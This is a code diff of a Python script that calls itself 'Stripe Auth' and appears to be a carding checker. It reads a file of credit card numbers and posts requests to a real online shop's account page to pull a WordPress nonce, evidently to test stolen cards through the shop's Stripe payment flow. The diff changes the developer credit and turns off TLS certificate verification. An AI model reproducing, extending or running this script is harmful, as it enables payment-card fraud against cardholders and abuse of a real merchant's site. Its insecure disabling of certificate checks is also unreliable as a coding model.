@@ -2,7 +2,8 @@ import requests,random,string,bs4,base64
 from bs4 import *
 import time,uuid,json,re,user_agent
 from user_agent import *
-
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 O =  '\033[1;31m' #Red.... like< Red Line > only Anime fan will know☆
 Z =  '\033[1;37m' #kwhite
@@ -11,7 +12,7 @@ B = '\033[2;36m' #Light Blue
 X = '\033[1;33m' #Yellow
 C = '\033[2;35m' #Purple
 print(X+'________________________________________________')
-print(Z+'''\nStripe Auth 0.0$ | Dev:@MAST4RCARD''')
+print(Z+'''\nStripe Auth 0.0$ | Dev:kienvnnn''')
 print(X+'________________________________________________')
 file = input(B+'YOUR FILE CC NAME : ')
 #tokbot = input('TOKEN YOUR BOT : ')
@@ -51,8 +52,7 @@ for P in file.readlines():
 	}
 	
 	
-	response = r.post('https://www.booth-box.com/my-account/', cookies=r.cookies, headers=headers)
-	
+	response = r.post('https://www.booth-box.com/my-account/', cookies=r.cookies, headers=headers, verify=False)
 	
 	reg_match = re.search(r'name="_wpnonce" value="(.*?)"', response.text)
 	reg = reg_match.group(1)
